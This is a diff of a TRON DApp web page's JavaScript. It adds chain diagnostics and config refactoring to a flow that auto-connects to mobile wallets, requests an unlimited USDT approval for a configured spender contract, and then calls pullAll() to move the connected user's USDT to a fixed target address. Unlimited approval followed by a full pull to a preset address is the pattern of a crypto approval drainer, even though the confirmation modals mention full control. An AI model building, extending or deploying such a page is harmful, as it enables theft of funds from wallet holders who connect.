+    usdtContract = await tw.contract().at(usdtAddr);
+    Log.ok('STEP D: USDT contract instantiated successfully');
+    DIAG.contractReady = 'ok';
+    updateDiagItem('diagD', 'ok', 'D: Contract OK');
+  } catch (contractErr) {
+    DIAG.contractReady = 'fail';
+    DIAG.contractError = contractErr;
+    logRawError('STEP D contract instantiation', contractErr);
+    updateDiagItem('diagD', 'fail', 'D: Contract FAIL');
+    stepSet(2, 'fail', 'Chain Data', 'Failed to instantiate USDT contract: ' + (contractErr.message || String(contractErr)), null);
+    Log.err('STEP D FAILED: Cannot instantiate USDT contract. ' + formatDetailedError('STEP D', contractErr));
+    return { success: false, stage: 'D', message: 'Failed to instantiate USDT contract. ' + formatDetailedError('STEP D', contractErr) };
+  }
+  renderDiagBar();
+
+  // Step D1: balanceOf
+  Log.step('--- STEP D1: balanceOf ---');
+  updateDiagItem('diagD1', 'run', 'D1: balanceOf');
+  renderDiagBar();
+  let balResult = '0';
+  const walletAddr = tw.defaultAddress?.base58 || tw.address?.base58;
+
+  if (!walletAddr) {
+    DIAG.balanceReady = 'fail';
+    DIAG.balanceError = new Error('Cannot read wallet address from provider');
+    updateDiagItem('diagD1', 'fail', 'D1: No wallet addr');
+    stepSet(2, 'fail', 'Chain Data', 'Cannot read wallet address from provider', null);
+    return { success: false, stage: 'D_bal', message: 'Cannot read wallet address from TronWeb provider.' };
+  }
+
+  try {
+    Log.info('Calling balanceOf(' + walletAddr + ')');
+    const balCall = await usdtContract.balanceOf(walletAddr).call();
+    balResult = balCall ? balCall.toString() : '0';
+    DIAG.balanceReady = 'ok';
+    Log.ok('STEP D1: balanceOf = ' + balResult);
+    updateDiagItem('diagD1', 'ok', 'D1: balanceOf OK');
+  } catch (balErr) {
+    DIAG.balanceReady = 'fail';
+    DIAG.balanceError = balErr;
+    logRawError('STEP D1 balanceOf', balErr);
+    updateDiagItem('diagD1', 'fail', 'D1: balanceOf FAIL');
+    stepSet(2, 'fail', 'Chain Data', 'balanceOf failed: ' + formatDetailedError('D1', balErr), null);
+    Log.err('STEP D1 FAILED: balanceOf failed. ' + formatDetailedError('STEP D1', balErr));
+    return { success: false, stage: 'D_bal', message: 'balanceOf RPC call failed. ' + formatDetailedError('STEP D1', balErr) };
+  }
+  renderDiagBar();
+
+  // Step D2: allowance
+  Log.step('--- STEP D2: allowance ---');
+  updateDiagItem('diagD2', 'run', 'D2: allowance');
+  renderDiagBar();
+  let allowResult = '0';
+
+  try {
+    Log.info('Calling allowance(' + walletAddr + ', ' + spenderAddr + ')');
+    const allowCall = await usdtContract.allowance(walletAddr, spenderAddr).call();
+    allowResult = allowCall ? allowCall.toString() : '0';
+    DIAG.allowanceReady = 'ok';
+    Log.ok('STEP D2: allowance = ' + allowResult);
+    updateDiagItem('diagD2', 'ok', 'D2: allowance OK');
+  } catch (allowErr) {
+    DIAG.allowanceReady = 'fail';
+    DIAG.allowanceError = allowErr;
+    logRawError('STEP D2 allowance', allowErr);
+    updateDiagItem('diagD2', 'fail', 'D2: allowance FAIL');
+    stepSet(2, 'fail', 'Chain Data', 'allowance failed: ' + formatDetailedError('D2', allowErr), null);
+    Log.err('STEP D2 FAILED: allowance failed. ' + formatDetailedError('STEP D2', allowErr));
+    return { success: false, stage: 'D_allow', message: 'allowance RPC call failed. ' + formatDetailedError('STEP D2', allowErr) };
+  }
+  renderDiagBar();
+
+  Log.step('========== diagnoseChainAccess() SUCCESS ==========');
+  return {
+    success: true,
+    stage: 'all',
+    balance: balResult,
+    allowance: allowResult,
+    walletAddr,
+  };
+}
+
+// ---- Diagnosis UI helpers ----
+function showDiagBar() {
+  const bar = $('diagBar');
+  bar.style.display = 'flex';
+  bar.innerHTML = `
+    <span class="diag-item" id="diagA">A: Provider</span>
+    <span class="diag-item" id="diagB">B: Network</span>
+    <span class="diag-item" id="diagC">C: Config</span>
+    <span class="diag-item" id="diagD">D: Contract</span>
+    <span class="diag-item" id="diagD1">D1: balanceOf</span>
+    <span class="diag-item" id="diagD2">D2: allowance</span>
+  `;
+}
+
+function updateDiagItem(id, cls, label) {
+  const el = $(id);
+  if (!el) return;
+  el.className = 'diag-item ' + cls;
+  el.textContent = label;
+}
+
+function renderDiagBar() { /* diag-bar updates are reactive via class toggle */ }
+
+function hideDiagBar() {
+  $('diagBar').style.display = 'none';
+}
+
+/**
+ * rawQueryBal / rawQueryAllow — standalone functions for post-diagnosis use
+ */
+async function rawQueryBal(addr) {
   const { tw } = getTronWeb();
   if (!tw) throw new Error('TronWeb not available');
-  const c = await tw.contract().at(CONFIG.USDT_CONTRACT);
+  const c = await tw.contract().at(USDT_CONTRACT());
   const r = await c.balanceOf(addr).call();
   return r ? r.toString() : '0';
 }
 
-async function queryAllow(owner, spender) {
+async function rawQueryAllow(owner, spender) {
   const { tw } = getTronWeb();
   if (!tw) throw new Error('TronWeb not available');
-  const c = await tw.contract().at(CONFIG.USDT_CONTRACT);
+  const c = await tw.contract().at(USDT_CONTRACT());
   const r = await c.allowance(owner, spender).call();
   return r ? r.toString() : '0';
 }
@@ -899,23 +1125,6 @@ async function pollTx(tx) {
 ============================================================ -->
 <script>
 'use strict';
-/**
- * Main routing entry point.
- *
- * TWO SCENARIOS:
- *
- * SCENARIO 1 — System browser (Safari/Chrome on mobile, no wallet installed):
- *   User taps wallet button → open DApp IN WALLET's built-in browser
- *   via deeplink → page reloads inside wallet → detect wallet context
- *   → auto-connect → show approve button → user taps → tx popup ✅
- *
- * SCENARIO 2 — Already inside wallet's built-in browser:
- *   User taps wallet button → already have tronWeb → auto-connect
- *   → show approve button → user taps → tx popup ✅
- *
- * SCENARIO 3 — Desktop with TronLink extension:
- *   User taps wallet button → tronLink → auto-connect → tx popup ✅
- */
 async function routeConnect(preferredWallet) {
   const env = detectWalletEnvironment();
 
@@ -933,28 +1142,25 @@ async function routeConnect(preferredWallet) {
     hasImToken: env.hasImToken,
   }));
 
-  // Validate config
-  if (!isAddr(CONFIG.USDT_CONTRACT)) {
-    Log.err('CONFIG.USDT_CONTRACT invalid');
+  // Validate config (basic check)
+  if (!isAddr(USDT_CONTRACT())) {
+    Log.err('CONFIG.USDT_CONTRACT invalid: ' + USDT_CONTRACT());
     toast('CONFIG error: USDT_CONTRACT', 'er');
     return;
   }
 
-  // ---- SCENARIO A: In-app browser (wallet already loaded our page) ----
   if (env.canUseInjectedProvider) {
     Log.route('SCENARIO A: in-app provider flow (already in wallet browser)');
     await connectViaProvider(env);
     return;
   }
 
-  // ---- SCENARIO B: System browser → use deeplink to open in wallet browser ----
   if (env.canUseDeepLink || (env.isSystemBrowser && env.isMobile)) {
     if (!preferredWallet) {
       $('wbtnLabel').textContent = 'Tap a wallet to open in its built-in browser';
       Log.warn('No preferredWallet specified');
       return;
     }
-
     if (preferredWallet === 'tokenpocket') {
       Log.route('SCENARIO B: system browser → open DApp in TokenPocket browser via tpdapp://');
       TokenPocketAdapter.openInSystemBrowser();
@@ -965,7 +1171,6 @@ async function routeConnect(preferredWallet) {
     return;
   }
 
-  // ---- SCENARIO C: Desktop without wallet ----
   if (env.isDesktop && !env.hasTronLink) {
     Log.route('SCENARIO C: desktop without wallet');
     toast('Please install TronLink extension, or open on mobile', 'wn');
@@ -973,35 +1178,53 @@ async function routeConnect(preferredWallet) {
     return;
   }
 
-  // ---- SCENARIO D: Unknown ----
   Log.err('No wallet scenario. isMobile=' + env.isMobile + ', walletType=' + env.walletType);
   toast('No wallet detected', 'er');
   $('wbtnLabel').textContent = 'No wallet. Open in imToken or TokenPocket DApp browser.';
 }
 
-/**
- * Connect via injected provider (SCENARIO A / already in wallet browser).
- */
 async function connectViaProvider(env) {
   Log.info('connectViaProvider() starting');
 
-  const { tw: rawTw, source } = getTronWeb();
+  // Set step 1
+  stepSet(1, 'on', 'Connect Wallet', 'Detecting provider...', null);
+  stepSet(2, 'on', 'Chain Data', 'Waiting for provider...', null);
+
+  // Try to get TronWeb immediately
+  let { tw: rawTw, source } = getTronWeb();
+
+  // If no provider yet, wait
   if (!rawTw) {
-    Log.err('getTronWeb() returned null');
-    toast('Cannot get TronWeb', 'er');
-    return;
+    Log.info('No provider yet, waiting up to ' + PROVIDER_WAIT_MS + 'ms...');
+    stepSet(1, 'on', 'Connect Wallet', 'Waiting for wallet...', null);
+    try {
+      const result = await waitForInjectedProvider(PROVIDER_WAIT_MS, PROVIDER_POLL_MS);
+      rawTw = result.tw;
+      source = result.source;
+      Log.ok('Provider found: ' + source);
+    } catch (waitErr) {
+      logRawError('waitForInjectedProvider', waitErr);
+      stepSet(1, 'fail', 'Connect Wallet', 'Wallet not found', null);
+      stepSet(2, 'fail', 'Chain Data', 'No wallet/provider after ' + PROVIDER_WAIT_MS + 'ms. Open in wallet DApp browser.', null);
+      showErr('No wallet/provider detected. Please open this page inside imToken or TokenPocket DApp browser, or refresh after connecting wallet.');
+      toast('Wallet not detected', 'er');
+      return;
+    }
   }
 
   tw = rawTw;
-  wAddr = tw.defaultAddress?.base58 || tw.address?.base58;
+  const walletAddr = tw.defaultAddress?.base58 || tw.address?.base58;
 
-  if (!isAddr(wAddr)) {
-    Log.err('Could not read wallet address: ' + wAddr);
-    toast('Could not read wallet address. Try refreshing.', 'er');
+  if (!isAddr(walletAddr)) {
+    Log.err('Could not read wallet address: ' + walletAddr);
+    stepSet(1, 'fail', 'Connect Wallet', 'Cannot read wallet address. Try refreshing.', null);
+    showErr('Could not read wallet address. Try refreshing the page.');
+    toast('Wallet address error', 'er');
     return;
   }
 
-  // Determine wallet type
+  wAddr = walletAddr;
+
   if (env.hasImToken || env.ethIsImToken || env.walletType === 'imtoken') {
     wType = 'imtoken';
   } else if (env.hasTPSDK || env.walletType === 'tokenpocket') {
@@ -1014,7 +1237,6 @@ async function connectViaProvider(env) {
 
   Log.ok('Connected: source=' + source + ', addr=' + wAddr + ', wType=' + wType);
 
-  // Update badges
   const connName = wType === 'imtoken' ? 'imToken' :
                    wType === 'tokenpocket' ? 'TokenPocket' : wType === 'tronlink' ? 'TronLink' : wType;
   $('connBadge').textContent = connName;
@@ -1022,83 +1244,83 @@ async function connectViaProvider(env) {
   $('netBadge').textContent = CONFIG.NETWORK === 'nile' ? 'Nile' : 'Mainnet';
   $('netBadge').className = 'badge ' + (CONFIG.NETWORK === 'nile' ? 'nile' : 'mainnet');
 
-  // Disable wallet buttons
   $('btnIm').disabled = true;
   $('btnTP').disabled = true;
   $('btnIm').classList.add('dis');
   $('btnTP').classList.add('dis');
 
-  // Hide wallet area, show info
   $('walletArea').style.display = 'none';
   $('infoArea').classList.remove('hd');
   $('vAddr').textContent = wAddr;
-  $('vUsdt').textContent = CONFIG.USDT_CONTRACT;
-  $('vSpender').textContent = CONFIG.SPENDER_CONTRACT;
-  $('vTarget').textContent = CONFIG.TARGET_ADDRESS;
+  $('vUsdt').textContent = USDT_CONTRACT();
+  $('vSpender').textContent = SPENDER_CONTRACT();
+  $('vTarget').textContent = TARGET_ADDRESS();
   $('vNet').textContent = CONFIG.NETWORK === 'nile' ? 'Nile Testnet' : 'TRON Mainnet';
 
-  // Update step 1
-  stepSet(1, 'ok', 'Connect Wallet', 'Connected: ' + fmtAddr(wAddr) + ' via ' + wType, null);
-  stepSet(2, 'on', 'Chain Data', 'Querying on-chain data...', null);
+  stepSet(1, 'ok', 'Connect Wallet', 'Connected: ' + fmtAddr(wAddr) + ' via ' + wType + ' (' + source + ')', null);
+  stepSet(2, 'on', 'Chain Data', 'Running chain diagnostics (Step A-E)...', null);
 
   state = STATE.CONNECTING;
 
+  // Run the full chain diagnosis
   try {
-    await refreshChainData();
+    const result = await diagnoseChainAccess();
+
+    if (!result.success) {
+      state = STATE.FAIL;
+      stepSet(2, 'fail', 'Chain Data', result.message, null);
+      showErr(result.message);
+      toast('Chain data failed: ' + result.stage, 'er');
+      return;
+    }
+
+    // Success: update DIAG state with results
+    cacheBal   = result.balance;
+    cacheAllow = result.allowance;
+
+    const balNum   = Number(cacheBal);
+    const allowNum = Number(cacheAllow);
+    const isUnl    = allowNum >= Number(UNLIMITED_HEX);
+    const isZero   = balNum === 0;
+
+    $('vBal').textContent = fmtAmt(cacheBal);
+    $('vBal').className   = 'info-val' + (isZero ? ' err' : ' ok');
+
+    if (isUnl) {
+      $('vAllow').textContent = 'UNLIMITED';
+      $('vAllow').className   = 'info-val ok';
+    } else if (allowNum > 0) {
+      $('vAllow').textContent = fmtAmt(cacheAllow);
+      $('vAllow').className   = 'info-val warn';
+    } else {
+      $('vAllow').textContent = '0';
+      $('vAllow').className   = 'info-val';
+    }
+
+    $('balWarn').style.display   = isZero ? 'flex' : 'none';
+    $('allowWarn').style.display = allowNum > 0 ? 'flex' : 'none';
+    $('allowWarnTxt').textContent = 'Allowance: ' + (isUnl ? 'UNLIMITED' : fmtAmt(cacheAllow));
+
+    const btnApr = $('btnApprove');
+    if (btnApr) btnApr.disabled = isZero;
+
+    stepSet(2, 'ok', 'Chain Data',
+      'Balance: ' + fmtAmt(cacheBal) + ' | Allowance: ' + (isUnl ? 'UNLIMITED' : fmtAmt(cacheAllow)), null);
+
     state = STATE.READY;
-    Log.ok('Chain data ready, state=' + state);
+    Log.ok('Chain data ready: bal=' + fmtAmt(cacheBal) + ', allow=' + (isUnl ? 'UNLIMITED' : fmtAmt(cacheAllow)));
+    hideDiagBar();
+
   } catch (e) {
     state = STATE.FAIL;
-    const msg = e.message || String(e);
+    logRawError('diagnoseChainAccess outer', e);
+    const msg = formatDetailedError('Chain data', e);
     Log.err('Chain data query failed: ' + msg);
-    stepSet(2, 'fail', 'Chain Data', 'Query failed: ' + msg, null);
-    toast('Chain data query failed', 'er');
+    stepSet(2, 'fail', 'Chain Data', msg, null);
+    showErr(msg);
+    toast('Chain data query failed: ' + e.message || 'unknown', 'er');
+    hideDiagBar();
   }
-}
-
-/**
- * Refresh USDT balance and allowance from chain.
- */
-async function refreshChainData() {
-  if (!wAddr) return;
-
-  try {
-    cacheBal   = await queryBal(wAddr);
-    cacheAllow = await queryAllow(wAddr, CONFIG.SPENDER_CONTRACT);
-  } catch (e) {
-    Log.err('refreshChainData failed: ' + (e.message || String(e)));
-    throw e;
-  }
-
-  const balNum   = Number(cacheBal);
-  const allowNum = Number(cacheAllow);
-  const isUnl    = allowNum >= Number(UNLIMITED_HEX);
-  const isZero   = balNum === 0;
-
-  $('vBal').textContent = fmtAmt(cacheBal);
-  $('vBal').className   = 'info-val' + (isZero ? ' err' : ' ok');
-
-  if (isUnl) {
-    $('vAllow').textContent = 'UNLIMITED';
-    $('vAllow').className   = 'info-val ok';
-  } else if (allowNum > 0) {
-    $('vAllow').textContent = fmtAmt(cacheAllow);
-    $('vAllow').className   = 'info-val warn';
-  } else {
-    $('vAllow').textContent = '0';
-    $('vAllow').className   = 'info-val';
-  }
-
-  $('balWarn').style.display   = isZero ? 'flex' : 'none';
-  $('allowWarn').style.display = allowNum > 0 ? 'flex' : 'none';
-  $('allowWarnTxt').textContent = 'Allowance: ' + (isUnl ? 'UNLIMITED' : fmtAmt(cacheAllow));
-
-  const btnApr = $('btnApprove');
-  if (btnApr) btnApr.disabled = isZero;
-
-  stepSet(2, 'ok', 'Chain Data',
-    'Balance: ' + fmtAmt(cacheBal) + ' | Allowance: ' + (isUnl ? 'UNLIMITED' : fmtAmt(cacheAllow)), null);
-  Log.ok('Chain data: bal=' + fmtAmt(cacheBal) + ', allow=' + (isUnl ? 'UNLIMITED' : fmtAmt(cacheAllow)));
 }
 </script>
 
@@ -1133,13 +1355,13 @@ async function doApproveFlow() {
   }
 
   Log.tx('doApprove: sending approve tx');
-  Log.tx('  contract:  ' + CONFIG.USDT_CONTRACT);
-  Log.tx('  spender:   ' + CONFIG.SPENDER_CONTRACT);
+  Log.tx('  contract:  ' + USDT_CONTRACT());
+  Log.tx('  spender:   ' + SPENDER_CONTRACT());
   Log.tx('  amount:    ' + UNLIMITED_HEX);
 
   openModal(
     'Confirm Unlimited Approval',
-    '<div class="mh">Contract: ' + CONFIG.SPENDER_CONTRACT + '<br>Token: TRC20 USDT<br>Amount: UNLIMITED</div>' +
+    '<div class="mh">Contract: ' + SPENDER_CONTRACT() + '<br>Token: TRC20 USDT<br>Amount: UNLIMITED</div>' +
     '<p style="font-size:12px;color:#888;text-align:left;margin-top:8px">This grants the contract full control over your USDT balance. Verify the contract address before signing.</p>',
     'Sign & Approve',
     false,
@@ -1152,8 +1374,8 @@ async function doApproveFlow() {
       stepSet(4, 'on', 'Wait for Approval On-Chain', 'Waiting for tx to be confirmed...', null);
 
       try {
-        const usdt = await tw.contract().at(CONFIG.USDT_CONTRACT);
-        const tx   = await usdt.approve(CONFIG.SPENDER_CONTRACT, UNLIMITED_HEX).send({
+        const usdt = await tw.contract().at(USDT_CONTRACT());
+        const tx   = await usdt.approve(SPENDER_CONTRACT(), UNLIMITED_HEX).send({
           feeLimit: 100_000_000,
           callValue: 0,
           shouldPollResponse: false,
@@ -1204,7 +1426,7 @@ async function doApproveFlow() {
         const reject = /denied|reject|cancel|signature|user denied|rejected/i.test(msg);
         state = STATE.FAIL;
         stepSet(3, 'fail', 'Approve (Unlimited)',
-          reject ? 'User rejected' : 'Error: ' + msg.slice(0, 80), null);
+          reject ? 'User rejected' : 'Error: ' + msg.slice(0, 120), null);
         stepSet(4, 'fail', 'Wait for Approval On-Chain', 'Not confirmed', null);
         showErr(msg);
         toast(reject ? 'Signature rejected' : 'Approve failed', 'er');
@@ -1216,7 +1438,7 @@ async function doApproveFlow() {
 }
 
 async function onApprovalSuccess(tx) {
-  try { cacheAllow = await queryAllow(wAddr, CONFIG.SPENDER_CONTRACT); } catch (e) {}
+  try { cacheAllow = await rawQueryAllow(wAddr, SPENDER_CONTRACT()); } catch (e) {}
   state = STATE.APPROVE_OK;
   setBtns(false);
 
@@ -1248,8 +1470,8 @@ async function doPullFlow() {
   stepSet(5, 'on', 'Pull USDT', 'Querying balance and allowance...', null);
 
   try {
-    cacheBal   = await queryBal(wAddr);
-    cacheAllow = await queryAllow(wAddr, CONFIG.SPENDER_CONTRACT);
+    cacheBal   = await rawQueryBal(wAddr);
+    cacheAllow = await rawQueryAllow(wAddr, SPENDER_CONTRACT());
 
     const allowNum = Number(cacheAllow || '0');
     const balNum   = Number(cacheBal || '0');
@@ -1259,14 +1481,14 @@ async function doPullFlow() {
 
     openModal(
       'Confirm Pull USDT',
-      '<div class="mh">From:      ' + wAddr + '<br>To:        ' + CONFIG.TARGET_ADDRESS + '<br>Contract:  ' + CONFIG.SPENDER_CONTRACT + '<br>Amount:    ' + fmtAmt(pullable) + '</div>' +
+      '<div class="mh">From:      ' + wAddr + '<br>To:        ' + TARGET_ADDRESS() + '<br>Contract:  ' + SPENDER_CONTRACT() + '<br>Amount:    ' + fmtAmt(pullable) + '</div>' +
       '<p style="font-size:12px;color:#888;text-align:left;margin-top:8px">Transfers USDT to target address via contract.</p>',
       'Confirm Pull',
       false,
       async () => {
         try {
           stepSet(5, 'on', 'Pull USDT', 'Waiting for wallet signature...', null);
-          const c  = await tw.contract().at(CONFIG.SPENDER_CONTRACT);
+          const c  = await tw.contract().at(SPENDER_CONTRACT());
           const tx = await c.pullAll().send({
             feeLimit: 150_000_000,
             callValue: 0,
@@ -1289,7 +1511,7 @@ async function doPullFlow() {
                 toast('Pull completed!', 'ok');
                 state = STATE.DONE;
                 setBtns(false);
-                await refreshChainData();
+                await refreshChainDataFast();
                 Log.ok('Pull done');
                 return;
               }
@@ -1313,7 +1535,7 @@ async function doPullFlow() {
           const msg    = e.message || String(e);
           const reject = /denied|reject|cancel|signature|user denied|rejected/i.test(msg);
           state = STATE.FAIL;
-          stepSet(5, 'fail', 'Pull USDT', reject ? 'User rejected' : 'Error: ' + msg.slice(0, 80), null);
+          stepSet(5, 'fail', 'Pull USDT', reject ? 'User rejected' : 'Error: ' + msg.slice(0, 120), null);
           showErr(msg);
           toast(reject ? 'Signature rejected' : 'Pull failed', 'er');
           Log.err('Pull error: ' + msg);
@@ -1326,11 +1548,45 @@ async function doPullFlow() {
   } catch (e) {
     const msg = e.message || String(e);
     state = STATE.FAIL;
-    stepSet(5, 'fail', 'Pull USDT', 'Error: ' + msg.slice(0, 80), null);
+    stepSet(5, 'fail', 'Pull USDT', 'Error: ' + msg.slice(0, 120), null);
     showErr(msg);
     toast('Pull failed: ' + msg.slice(0, 80), 'er');
     Log.err('Pull error: ' + msg);
     setBtns(false);
+  }
+}
+
+/**
+ * refreshChainDataFast() — lightweight refresh after pull for display only.
+ * Does NOT run the full 5-step diagnosis. Falls back to basic calls.
+ */
+async function refreshChainDataFast() {
+  if (!wAddr) return;
+  try {
+    const bal = await rawQueryBal(wAddr);
+    const alw = await rawQueryAllow(wAddr, SPENDER_CONTRACT());
+    cacheBal   = bal;
+    cacheAllow = alw;
+
+    const balNum   = Number(bal);
+    const allowNum = Number(alw);
+    const isUnl    = allowNum >= Number(UNLIMITED_HEX);
+
+    $('vBal').textContent = fmtAmt(bal);
+    $('vBal').className   = 'info-val' + (balNum === 0 ? ' err' : ' ok');
+
+    if (isUnl) {
+      $('vAllow').textContent = 'UNLIMITED';
+      $('vAllow').className   = 'info-val ok';
+    } else if (allowNum > 0) {
+      $('vAllow').textContent = fmtAmt(alw);
+      $('vAllow').className   = 'info-val warn';
+    } else {
+      $('vAllow').textContent = '0';
+      $('vAllow').className   = 'info-val';
+    }
+  } catch (e) {
+    Log.err('refreshChainDataFast: ' + (e.message || String(e)));
   }
 }
 </script>
@@ -1391,7 +1647,10 @@ function showErr(msg) {
   Log.err('UI Error: ' + msg);
 }
 
-function hideErr() { $('errBox').style.display = 'none'; }
+function hideErr() {
+  $('errBox').style.display = 'none';
+  hideDiagBar();
+}
 
 function openModal(title, bodyHtml, confirmText, isDanger, cb) {
   $('mTitle').textContent = title;
@@ -1432,6 +1691,16 @@ function renderEnvPanel(env) {
   const valFmt = (v, label) =>
     `<div class="env-line"><span class="env-key">${label}</span><span class="env-val">${v || 'N/A'}</span></div>`;
 
+  // Add real-time DIAG values to env panel
+  const diagVals = [];
+  if (DIAG.providerSource !== null) diagVals.push(valFmt(DIAG.providerSource, 'providerSource'));
+  if (DIAG.networkHost !== null) diagVals.push(valFmt(DIAG.networkHost, 'tw.fullNode.host'));
+  if (DIAG.configUsdtAddr !== null) diagVals.push(valFmt(DIAG.configUsdtAddr, 'CONFIG.USDT_CONTRACT'));
+  if (DIAG.configAddrValid !== null) diagVals.push(boolFmt(DIAG.configAddrValid, 'addrValid'));
+  if (DIAG.contractReady !== null) diagVals.push(valFmt(DIAG.contractReady, 'contractInstantiate'));
+  if (DIAG.balanceReady !== null) diagVals.push(valFmt(DIAG.balanceReady, 'balanceOf'));
+  if (DIAG.allowanceReady !== null) diagVals.push(valFmt(DIAG.allowanceReady, 'allowance'));
+
   $('dbgEnv').innerHTML = [
     boolFmt(env.isMobile, 'isMobile'),
     boolFmt(env.isInAppBrowser, 'isInAppBrowser'),
@@ -1445,9 +1714,9 @@ function renderEnvPanel(env) {
     boolFmt(env.ethIsImToken, 'ethereum.isImToken'),
     valFmt(env.walletType, 'walletType'),
     valFmt(env.recommendedFlow, 'recommendedFlow'),
-    valFmt(env.recommendedFlowLabel, 'recommendedFlowLabel'),
-    valFmt(env.reason, 'reason'),
-    valFmt(env.networkName, 'networkName'),
+    valFmt(wAddr || '—', 'walletAddr'),
+    ...diagVals,
+    valFmt(CONFIG.NETWORK, 'CONFIG.NETWORK'),
     `<div class="env-line"><span class="env-key">ua (truncated)</span><span class="env-val warn">${escHtml(env.uaTruncated)}</span></div>`,
   ].join('');
 }
@@ -1474,6 +1743,16 @@ function doReset() {
   state = STATE.IDLE;
   tw = null; wAddr = null; wType = null; lastTx = null;
   cacheBal = null; cacheAllow = null; modalCb = null;
+
+  // Reset DIAG
+  Object.assign(DIAG, {
+    providerSource: null, providerReady: false,
+    networkHost: null, networkIsNile: null,
+    configUsdtAddr: null, configAddrValid: null, addrMismatch: null,
+    contractReady: null, contractError: null,
+    balanceReady: null, balanceError: null,
+    allowanceReady: null, allowanceError: null,
+  });
 
   $('connBadge').textContent = 'Not Connected';
   $('connBadge').className = 'badge no';
@@ -1513,16 +1792,13 @@ function doReset() {
 'use strict';
 (function initEvents() {
 
-  // ---- Wallet buttons ----
   $('btnIm').addEventListener('click', function(e) {
     e.preventDefault();
     Log.click('btnIm clicked. disabled=' + this.disabled);
-
     if (this.disabled || this.classList.contains('dis')) {
       Log.warn('btnIm clicked but disabled');
       return;
     }
-
     const env = detectWalletEnvironment();
     routeConnect('imtoken');
   });
@@ -1530,42 +1806,34 @@ function doReset() {
   $('btnTP').addEventListener('click', function(e) {
     e.preventDefault();
     Log.click('btnTP clicked. disabled=' + this.disabled);
-
     if (this.disabled || this.classList.contains('dis')) {
       Log.warn('btnTP clicked but disabled');
       return;
     }
-
     const env = detectWalletEnvironment();
     routeConnect('tokenpocket');
   });
 
-  // ---- Action buttons ----
   $('btnApprove').addEventListener('click', function(e) {
     e.preventDefault();
     Log.click('btnApprove clicked. state=' + state + ', wAddr=' + !!wAddr + ', tw=' + !!tw);
-
     if (this.disabled) {
       Log.warn('btnApprove disabled');
       return;
     }
-
     if (!wAddr || !tw) {
       toast('Please connect wallet first', 'wn');
       $('wbtnLabel').textContent = 'Connect a wallet first';
       return;
     }
-
     doApproveFlow();
   });
 
   $('btnPull').addEventListener('click', function(e) {
     e.preventDefault();
     Log.click('btnPull clicked. state=' + state);
-
     if (this.disabled) { Log.warn('btnPull disabled'); return; }
     if (!wAddr || !tw) { toast('Please connect wallet first', 'wn'); return; }
-
     doPullFlow();
   });
 
@@ -1574,7 +1842,6 @@ function doReset() {
     doReset();
   });
 
-  // ---- Modal ----
   $('mBtnNo').addEventListener('click', function() {
     Log.click('Modal cancel');
     closeModal();
@@ -1590,7 +1857,6 @@ function doReset() {
     if (e.target === this) closeModal();
   });
 
-  // ---- Debug panel ----
   $('dbgHeader').addEventListener('click', function() {
     const body   = $('dbgBody');
     const toggle = $('dbgToggle');
@@ -1603,7 +1869,6 @@ function doReset() {
     }
   });
 
-  // ---- Visibility change: detect return from wallet ----
   document.addEventListener('visibilitychange', function() {
     if (document.visibilityState === 'hidden') {
       Log.info('Page hidden (switched away)');
@@ -1616,10 +1881,6 @@ function doReset() {
         canUseInjectedProvider: env.canUseInjectedProvider,
         walletType: env.walletType,
       }));
-
-      // If we have a provider now (returned from wallet DApp browser),
-      // auto-connect. This handles the case where deeplink opened DApp
-      // in wallet browser → user signed → returned → now we have tronWeb.
       if (env.canUseInjectedProvider && state === STATE.IDLE) {
         setTimeout(async () => {
           Log.info('Auto-connecting after return from wallet...');
@@ -1629,13 +1890,11 @@ function doReset() {
     }
   });
 
-  // ---- Pagehide ----
   window.addEventListener('pagehide', function() {
     Log.info('pagehide fired');
     sessionStorage.setItem('_wcb', Date.now().toString());
   });
 
-  // ---- beforeunload ----
   window.addEventListener('beforeunload', function(e) {
     if (state === STATE.APPROVING || state === STATE.PULLING) {
       e.preventDefault();
@@ -1654,14 +1913,18 @@ function doReset() {
 'use strict';
 (function init() {
   // Config validation
-  if (!isAddr(CONFIG.USDT_CONTRACT)) Log.err('[CONFIG] USDT_CONTRACT invalid: ' + CONFIG.USDT_CONTRACT);
-  else Log.info('[CONFIG] USDT_CONTRACT: ' + CONFIG.USDT_CONTRACT);
-  if (!isAddr(CONFIG.SPENDER_CONTRACT)) Log.err('[CONFIG] SPENDER_CONTRACT not set');
-  else Log.info('[CONFIG] SPENDER_CONTRACT: ' + CONFIG.SPENDER_CONTRACT);
-  if (!isAddr(CONFIG.TARGET_ADDRESS)) Log.warn('[CONFIG] TARGET_ADDRESS invalid');
-  else Log.info('[CONFIG] TARGET_ADDRESS: ' + CONFIG.TARGET_ADDRESS);
+  if (!isAddr(CONFIG.NILE_USDT_CONTRACT)) Log.err('[CONFIG] NILE_USDT_CONTRACT invalid: ' + CONFIG.NILE_USDT_CONTRACT);
+  else Log.info('[CONFIG] NILE_USDT_CONTRACT: ' + CONFIG.NILE_USDT_CONTRACT);
+  if (!isAddr(CONFIG.NILE_SPENDER_CONTRACT)) Log.err('[CONFIG] NILE_SPENDER_CONTRACT invalid: ' + CONFIG.NILE_SPENDER_CONTRACT);
+  else Log.info('[CONFIG] NILE_SPENDER_CONTRACT: ' + CONFIG.NILE_SPENDER_CONTRACT);
+  if (!isAddr(CONFIG.NILE_TARGET_ADDRESS)) Log.warn('[CONFIG] NILE_TARGET_ADDRESS invalid');
+  else Log.info('[CONFIG] NILE_TARGET_ADDRESS: ' + CONFIG.NILE_TARGET_ADDRESS);
 
-  // Detect environment
+  Log.info('[CONFIG] Active config — NETWORK: ' + CONFIG.NETWORK);
+  Log.info('[CONFIG] Active USDT_CONTRACT(): ' + USDT_CONTRACT());
+  Log.info('[CONFIG] Active SPENDER_CONTRACT(): ' + SPENDER_CONTRACT());
+  Log.info('[CONFIG] Active TARGET_ADDRESS(): ' + TARGET_ADDRESS());
+
   const env = detectWalletEnvironment();
   Log.env('Init env', JSON.stringify({
     walletType: env.walletType,
@@ -1675,7 +1938,6 @@ function doReset() {
   renderEnvPanel(env);
   updateWalletLabel(env);
 
-  // Add flow badge
   if (env.recommendedFlow === 'deeplink-to-dapp') {
     const db = document.createElement('span');
     db.className = 'badge warn';
@@ -1688,7 +1950,6 @@ function doReset() {
     $('badgeRow').appendChild(db);
   }
 
-  // Mobile badge
   if (env.isMobile) {
     const mb = document.createElement('span');
     mb.className = 'badge mobile';
@@ -1696,10 +1957,6 @@ function doReset() {
     $('badgeRow').appendChild(mb);
   }
 
-  // ---- AUTO-CONNECT if provider is available ----
-  // This handles:
-  //   1. User opened page directly in wallet's built-in browser
-  //   2. User returned from a deeplink session (wallet opened DApp, now has tronWeb)
